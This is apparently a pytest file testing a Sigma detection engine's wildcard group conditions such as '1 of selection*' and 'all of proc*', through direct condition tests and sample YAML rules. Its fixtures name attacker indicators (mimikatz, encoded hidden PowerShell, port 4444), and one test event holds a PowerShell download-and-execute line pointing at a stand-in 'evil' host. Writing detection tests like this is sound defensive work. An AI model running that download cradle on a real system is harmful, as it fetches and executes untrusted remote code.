"""Tests for feature 8.15 — Sigma: `1 of selection*` (wildcard group).

Coverage for _Condition._eval_condition() with the wildcard group operator:

  Direct _Condition API:
  - `1 of selection*` — arbitrary prefix wildcard (proc*, net*, etc.) → correct scoping
  - `1 of selection*` — case-insensitive pattern matching → True
  - `1 of selection*` — pattern matches no keys → False
  - `1 of *` — bare wildcard is equivalent to `1 of them` → True / False
  - `1 of selection*` with field modifiers (contains, startswith, endswith, re) — matching → True
  - `1 of selection*` with field modifiers — no match → False
  - `1 of selection*` AND NOT filter — compound condition → True / False
  - `1 of selection* or 1 of filter*` — disjunction of wildcard groups → True
  - `all of selection*` — pattern matches no keys → False
  - `all of selection*` — partial prefix overlap: only starred keys evaluated

  Via load_rule_yaml integration:
  - Rule with `1 of proc*` — one proc selection matches → True
  - Rule with `1 of proc*` — no proc selection matches → False
  - Rule with `1 of selection* and not filter` — compound → True only when filter absent
  - Rule with `all of selection* and not filter` — all selections match, filter excluded → True
  - Rule with multiple wildcard prefixes in OR condition → True when any group fires
"""

from __future__ import annotations

import pytest

from app.engine.sigma_engine import SigmaEngine, _Condition


# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------

def _cond(selections: dict, condition: str) -> _Condition:
    """Build a _Condition with named selections and a condition string."""
    det = dict(selections)
    det["condition"] = condition
    return _Condition(det)


# ---------------------------------------------------------------------------
# Fixtures
# ---------------------------------------------------------------------------

@pytest.fixture
def engine() -> SigmaEngine:
    return SigmaEngine()


# ---------------------------------------------------------------------------
# Arbitrary prefix wildcards (non-"selection" prefixes)
# ---------------------------------------------------------------------------

def test_proc_prefix_wildcard_one_matches() -> None:
    """`1 of proc*` — one proc* selection matches → True; other prefix excluded."""
    cond = _cond(
        {
            "proc_exec": {"name": "powershell.exe"},
            "proc_args": {"cmd_line|contains": "-enc"},
            "net_conn": {"dst_port": "4444"},
        },
        "1 of proc*",
    )
    # net_conn does not match the pattern; proc_exec matches
    assert cond.matches({"name": "powershell.exe", "cmd_line": "-nop", "dst_port": "80"}) is True


def test_proc_prefix_wildcard_none_match() -> None:
    """`1 of proc*` — no proc* selection fires → False; non-proc prefix irrelevant."""
    cond = _cond(
        {
            "proc_exec": {"name": "powershell.exe"},
            "proc_args": {"cmd_line|contains": "-enc"},
            "net_conn": {"dst_port": "4444"},
        },
        "1 of proc*",
    )
    # net_conn would match dst_port 4444, but net_conn is excluded from pattern
    assert cond.matches({"name": "cmd.exe", "cmd_line": "-nop", "dst_port": "4444"}) is False


def test_net_prefix_wildcard_fires() -> None:
    """`1 of net*` — a net* selection fires → True; proc* selections excluded."""
    cond = _cond(
        {
            "net_dst": {"dst_ip": "10.10.10.1"},
            "net_port": {"dst_port": "4444"},
            "proc_exec": {"name": "powershell.exe"},
        },
        "1 of net*",
    )
    # net_port matches; proc_exec is not in scope for this pattern
    assert cond.matches({"name": "powershell.exe", "dst_ip": "1.1.1.1", "dst_port": "4444"}) is True


# ---------------------------------------------------------------------------
# Case-insensitive pattern matching
# ---------------------------------------------------------------------------

def test_pattern_case_insensitive_match() -> None:
    """`1 of Selection*` (mixed case) matches keys starting with 'selection' → True."""
    cond = _cond(
        {
            "selection_proc": {"name": "mimikatz.exe"},
            "filter": {"user": "admin"},
        },
        "1 of Selection*",   # uppercase S in pattern
    )
    # selection_proc matches both pattern (case-insensitive) and event
    assert cond.matches({"name": "mimikatz.exe", "user": "guest"}) is True


def test_pattern_case_insensitive_no_match() -> None:
    """`1 of SELECTION*` matches keys starting with 'selection' → False if no event match."""
    cond = _cond(
        {
            "selection_proc": {"name": "mimikatz.exe"},
            "filter": {"user": "admin"},
        },
        "1 of SELECTION*",
    )
    assert cond.matches({"name": "cmd.exe", "user": "admin"}) is False


# ---------------------------------------------------------------------------
# Pattern matches no keys in the compiled set
# ---------------------------------------------------------------------------

def test_1_of_pattern_no_keys_match_pattern() -> None:
    """`1 of nonexistent*` — no compiled key starts with 'nonexistent' → False."""
    cond = _cond(
        {
            "selection_main": {"name": "powershell.exe"},
            "filter": {"user": "svc"},
        },
        "1 of nonexistent*",
    )
    assert cond.matches({"name": "powershell.exe", "user": "admin"}) is False


def test_all_of_pattern_no_keys_match_pattern() -> None:
    """`all of nonexistent*` — no keys match → False (vacuously false)."""
    cond = _cond(
        {
            "selection_main": {"name": "powershell.exe"},
            "filter": {"user": "svc"},
        },
        "all of nonexistent*",
    )
    assert cond.matches({"name": "powershell.exe", "user": "svc"}) is False


# ---------------------------------------------------------------------------
# Bare wildcard `1 of *` acts like `1 of them`
# ---------------------------------------------------------------------------

def test_bare_wildcard_equivalent_to_1_of_them_true() -> None:
    """`1 of *` — any selection matches → True (equivalent to `1 of them`)."""
    cond = _cond(
        {
            "sel_a": {"name": "powershell.exe"},
            "sel_b": {"cmd_line|contains": "-enc"},
        },
        "1 of *",
    )
    # sel_a matches
    assert cond.matches({"name": "powershell.exe", "cmd_line": "-nop"}) is True


def test_bare_wildcard_equivalent_to_1_of_them_false() -> None:
    """`1 of *` — no selection matches → False."""
    cond = _cond(
        {
            "sel_a": {"name": "powershell.exe"},
            "sel_b": {"cmd_line|contains": "-enc"},
        },
        "1 of *",
    )
    assert cond.matches({"name": "cmd.exe", "cmd_line": "-nop"}) is False


# ---------------------------------------------------------------------------
# Wildcard group with field modifiers
# ---------------------------------------------------------------------------

def test_wildcard_group_with_startswith_modifier_matches() -> None:
    """`1 of selection*` with startswith modifier — matching selection fires → True."""
    cond = _cond(
        {
            "selection_cmd": {"cmd_line|startswith": "powershell"},
            "selection_dir": {"path|startswith": r"C:\Windows\Temp"},
            "filter": {"user": "system"},
        },
        "1 of selection*",
    )
    event = {"cmd_line": "powershell -nop -w hidden", "path": r"C:\Users\admin\file.txt", "user": "admin"}
    assert cond.matches(event) is True


def test_wildcard_group_with_endswith_modifier_matches() -> None:
    """`1 of selection*` with endswith modifier — matching selection fires → True."""
    cond = _cond(
        {
            "selection_exe": {"name|endswith": ".exe"},
            "selection_dll": {"name|endswith": ".dll"},
            "filter": {"signed": "true"},
        },
        "1 of selection*",
    )
    event = {"name": "malware.dll", "signed": "true"}
    assert cond.matches(event) is True


def test_wildcard_group_with_re_modifier_matches() -> None:
    """`1 of selection*` with re modifier — regex selection fires → True."""
    cond = _cond(
        {
            "selection_b64": {"cmd_line|re": r"[A-Za-z0-9+/]{40,}={0,2}"},
            "selection_iex": {"cmd_line|contains": "iex"},
            "filter_legit": {"signed": "true"},
        },
        "1 of selection*",
    )
    # selection_iex matches
    event = {"cmd_line": "iex (New-Object Net.WebClient).DownloadString('http://evil')", "signed": "false"}
    assert cond.matches(event) is True


def test_wildcard_group_with_modifiers_none_match() -> None:
    """`1 of selection*` with mixed modifiers — no selection fires → False."""
    cond = _cond(
        {
            "selection_cmd": {"cmd_line|startswith": "powershell"},
            "selection_user": {"user|contains": "admin"},
            "filter": {"signed": "true"},
        },
        "1 of selection*",
    )
    event = {"cmd_line": "cmd.exe /c whoami", "user": "guest", "signed": "false"}
    assert cond.matches(event) is False


# ---------------------------------------------------------------------------
# Compound conditions: wildcard group AND NOT
# ---------------------------------------------------------------------------

def test_1_of_selection_and_not_filter_true() -> None:
    """`1 of selection* and not filter` — selection fires, filter does not → True."""
    cond = _cond(
        {
            "selection_proc": {"name": "powershell.exe"},
            "selection_args": {"cmd_line|contains": "-enc"},
            "filter": {"user": "svc_automation"},
        },
        "1 of selection* and not filter",
    )
    # selection_proc matches; filter does NOT match (user != svc_automation) → True
    event = {"name": "powershell.exe", "cmd_line": "-nop", "user": "jdoe"}
    assert cond.matches(event) is True


def test_1_of_selection_and_not_filter_false_when_filter_matches() -> None:
    """`1 of selection* and not filter` — selection fires but filter also fires → False."""
    cond = _cond(
        {
            "selection_proc": {"name": "powershell.exe"},
            "selection_args": {"cmd_line|contains": "-enc"},
            "filter": {"user": "svc_automation"},
        },
        "1 of selection* and not filter",
    )
    # selection_proc matches; but filter ALSO matches → overall False
    event = {"name": "powershell.exe", "cmd_line": "-nop", "user": "svc_automation"}
    assert cond.matches(event) is False


def test_1_of_selection_and_not_filter_false_when_no_selection_matches() -> None:
    """`1 of selection* and not filter` — no selection fires → False regardless of filter."""
    cond = _cond(
        {
            "selection_proc": {"name": "powershell.exe"},
            "selection_args": {"cmd_line|contains": "-enc"},
            "filter": {"user": "svc_automation"},
        },
        "1 of selection* and not filter",
    )
    event = {"name": "cmd.exe", "cmd_line": "-nop", "user": "jdoe"}
    assert cond.matches(event) is False


# ---------------------------------------------------------------------------
# Disjunction of two wildcard groups
# ---------------------------------------------------------------------------

def test_1_of_selection_or_1_of_filter_only_selection_fires() -> None:
    """`1 of selection* or 1 of filter*` — selection group fires → True."""
    cond = _cond(
        {
            "selection_proc": {"name": "powershell.exe"},
            "filter_user": {"user": "svc_av"},
        },
        "1 of selection* or 1 of filter*",
    )
    # selection_proc fires; filter_user does not
    event = {"name": "powershell.exe", "user": "jdoe"}
    assert cond.matches(event) is True


def test_1_of_selection_or_1_of_filter_only_filter_fires() -> None:
    """`1 of selection* or 1 of filter*` — filter group fires → True."""
    cond = _cond(
        {
            "selection_proc": {"name": "powershell.exe"},
            "filter_user": {"user": "svc_av"},
        },
        "1 of selection* or 1 of filter*",
    )
    # selection_proc does not fire; filter_user does
    event = {"name": "cmd.exe", "user": "svc_av"}
    assert cond.matches(event) is True


def test_1_of_selection_or_1_of_filter_neither_fires() -> None:
    """`1 of selection* or 1 of filter*` — neither group fires → False."""
    cond = _cond(
        {
            "selection_proc": {"name": "powershell.exe"},
            "filter_user": {"user": "svc_av"},
        },
        "1 of selection* or 1 of filter*",
    )
    event = {"name": "cmd.exe", "user": "jdoe"}
    assert cond.matches(event) is False


# ---------------------------------------------------------------------------
# `all of selection*` scoping edge cases
# ---------------------------------------------------------------------------

def test_all_of_selection_only_starred_keys_evaluated() -> None:
    """`all of selection*` — only selection* keys evaluated; filter excluded even if it fails."""
    cond = _cond(
        {
            "selection_proc": {"name": "powershell.exe"},
            "selection_args": {"cmd_line|contains": "-enc"},
            "filter": {"user": "svc_av"},  # would fail — but excluded from pattern
        },
        "all of selection*",
    )
    # Both selection_* match; filter is excluded
    event = {"name": "powershell.exe", "cmd_line": "powershell -enc abc", "user": "svc_av"}
    assert cond.matches(event) is True


def test_all_of_selection_partial_match_fails() -> None:
    """`all of selection*` — one selection fails → False."""
    cond = _cond(
        {
            "selection_proc": {"name": "powershell.exe"},
            "selection_args": {"cmd_line|contains": "-enc"},
            "selection_user": {"user": "admin"},
        },
        "all of selection*",
    )
    # selection_user fails (user = guest)
    event = {"name": "powershell.exe", "cmd_line": "powershell -enc abc", "user": "guest"}
    assert cond.matches(event) is False


def test_all_of_proc_prefix_only_proc_keys_evaluated() -> None:
    """`all of proc*` — only proc* keys are in scope; non-proc keys ignored."""
    cond = _cond(
        {
            "proc_name": {"name": "svchost.exe"},
            "proc_pid": {"pid": "1"},
            "net_dst": {"dst_ip": "8.8.8.8"},   # excluded from all-of-proc* scope
        },
        "all of proc*",
    )
    # proc_name and proc_pid both match; net_dst is irrelevant
    event = {"name": "svchost.exe", "pid": "1", "dst_ip": "1.1.1.1"}
    assert cond.matches(event) is True


# ---------------------------------------------------------------------------
# Via load_rule_yaml — integration tests
# ---------------------------------------------------------------------------

_RULE_PROC_WILDCARD = """\
title: Suspicious Process Group Detection
id: test-8dot15-001
status: test
level: high
logsource:
  category: process_creation
detection:
  proc_name:
    name: powershell.exe
  proc_encoded:
    cmd_line|contains: '-enc'
  proc_hidden:
    cmd_line|contains: hidden
  filter_legit:
    user: svc_deploy
  condition: 1 of proc*
"""

_RULE_COMPOUND_WILDCARD = """\
title: Compound Wildcard Condition
id: test-8dot15-002
status: test
level: high
logsource:
  category: process_creation
detection:
  selection_proc:
    name: powershell.exe
  selection_args:
    cmd_line|contains: '-enc'
  filter_user:
    user: svc_automation
  condition: 1 of selection* and not filter_user
"""

_RULE_ALL_COMPOUND = """\
title: All Selection Wildcard with Filter
id: test-8dot15-003
status: test
level: critical
logsource:
  category: process_creation
detection:
  selection_name:
    name: powershell.exe
  selection_encoded:
    cmd_line|contains: '-enc'
  filter_trusted:
    user: trusted_svc
  condition: all of selection* and not filter_trusted
"""

_RULE_MULTI_GROUP_OR = """\
title: Multi-Group Wildcard OR
id: test-8dot15-004
status: test
level: medium
logsource:
  category: process_creation
detection:
  proc_exec:
    name: mimikatz.exe
  net_beacon:
    dst_port: 4444
  condition: 1 of proc* or 1 of net*
"""


def test_rule_proc_wildcard_one_proc_selection_matches(engine: SigmaEngine) -> None:
    """Rule `1 of proc*` — proc_name fires → True; filter_legit excluded from pattern."""
    rule = engine.load_rule_yaml(_RULE_PROC_WILDCARD)
    assert rule is not None
    event = {"name": "powershell.exe", "cmd_line": "-nop", "user": "svc_deploy"}
    # proc_name matches the event (powershell.exe); filter_legit is outside proc* scope
    assert rule._matcher.matches(event) is True


def test_rule_proc_wildcard_encoded_arg_fires(engine: SigmaEngine) -> None:
    """Rule `1 of proc*` — proc_encoded fires → True."""
    rule = engine.load_rule_yaml(_RULE_PROC_WILDCARD)
    assert rule is not None
    event = {"name": "cmd.exe", "cmd_line": "some -enc thing", "user": "jdoe"}
    assert rule._matcher.matches(event) is True


def test_rule_proc_wildcard_none_match(engine: SigmaEngine) -> None:
    """Rule `1 of proc*` — no proc selection fires → False."""
    rule = engine.load_rule_yaml(_RULE_PROC_WILDCARD)
    assert rule is not None
    event = {"name": "cmd.exe", "cmd_line": "whoami /priv", "user": "jdoe"}
    assert rule._matcher.matches(event) is False


def test_rule_proc_wildcard_filter_outside_scope(engine: SigmaEngine) -> None:
    """Rule `1 of proc*` — filter_legit is outside proc* scope → match still fires."""
    rule = engine.load_rule_yaml(_RULE_PROC_WILDCARD)
    assert rule is not None
    # proc_name matches; filter_legit is NOT in scope for `1 of proc*`
    event = {"name": "powershell.exe", "cmd_line": "-nop", "user": "svc_deploy"}
    assert rule._matcher.matches(event) is True


def test_rule_compound_selection_fires_filter_absent(engine: SigmaEngine) -> None:
    """Rule `1 of selection* and not filter_user` — selection fires, filter absent → True."""
    rule = engine.load_rule_yaml(_RULE_COMPOUND_WILDCARD)
    assert rule is not None
    event = {"name": "powershell.exe", "cmd_line": "-nop", "user": "jdoe"}
    assert rule._matcher.matches(event) is True


def test_rule_compound_selection_fires_filter_present(engine: SigmaEngine) -> None:
    """Rule `1 of selection* and not filter_user` — selection fires but filter also fires → False."""
    rule = engine.load_rule_yaml(_RULE_COMPOUND_WILDCARD)
    assert rule is not None
    event = {"name": "powershell.exe", "cmd_line": "-nop", "user": "svc_automation"}
    assert rule._matcher.matches(event) is False


def test_rule_compound_no_selection_fires(engine: SigmaEngine) -> None:
    """Rule `1 of selection* and not filter_user` — no selection fires → False."""
    rule = engine.load_rule_yaml(_RULE_COMPOUND_WILDCARD)
    assert rule is not None
    event = {"name": "cmd.exe", "cmd_line": "whoami", "user": "jdoe"}
    assert rule._matcher.matches(event) is False


def test_rule_all_compound_all_match_filter_absent(engine: SigmaEngine) -> None:
    """Rule `all of selection* and not filter_trusted` — all selections match, filter absent → True."""
    rule = engine.load_rule_yaml(_RULE_ALL_COMPOUND)
    assert rule is not None
    event = {"name": "powershell.exe", "cmd_line": "powershell -enc abc", "user": "jdoe"}
    assert rule._matcher.matches(event) is True


def test_rule_all_compound_partial_selection_fail(engine: SigmaEngine) -> None:
    """Rule `all of selection* and not filter_trusted` — one selection fails → False."""
    rule = engine.load_rule_yaml(_RULE_ALL_COMPOUND)
    assert rule is not None
    # selection_encoded fails (no -enc)
    event = {"name": "powershell.exe", "cmd_line": "powershell -nop", "user": "jdoe"}
    assert rule._matcher.matches(event) is False


def test_rule_all_compound_filter_blocks(engine: SigmaEngine) -> None:
    """Rule `all of selection* and not filter_trusted` — all match but filter fires → False."""
    rule = engine.load_rule_yaml(_RULE_ALL_COMPOUND)
    assert rule is not None
    event = {"name": "powershell.exe", "cmd_line": "powershell -enc abc", "user": "trusted_svc"}
    assert rule._matcher.matches(event) is False


def test_rule_multi_group_or_proc_fires(engine: SigmaEngine) -> None:
    """Rule `1 of proc* or 1 of net*` — proc group fires → True."""
    rule = engine.load_rule_yaml(_RULE_MULTI_GROUP_OR)
    assert rule is not None
    event = {"name": "mimikatz.exe", "dst_port": "80"}
    assert rule._matcher.matches(event) is True


def test_rule_multi_group_or_net_fires(engine: SigmaEngine) -> None:
    """Rule `1 of proc* or 1 of net*` — net group fires → True."""
    rule = engine.load_rule_yaml(_RULE_MULTI_GROUP_OR)
    assert rule is not None
    event = {"name": "svchost.exe", "dst_port": "4444"}
    assert rule._matcher.matches(event) is True


def test_rule_multi_group_or_neither_fires(engine: SigmaEngine) -> None:
    """Rule `1 of proc* or 1 of net*` — neither group fires → False."""
    rule = engine.load_rule_yaml(_RULE_MULTI_GROUP_OR)
    assert rule is not None
    event = {"name": "svchost.exe", "dst_port": "80"}
    assert rule._matcher.matches(event) is False
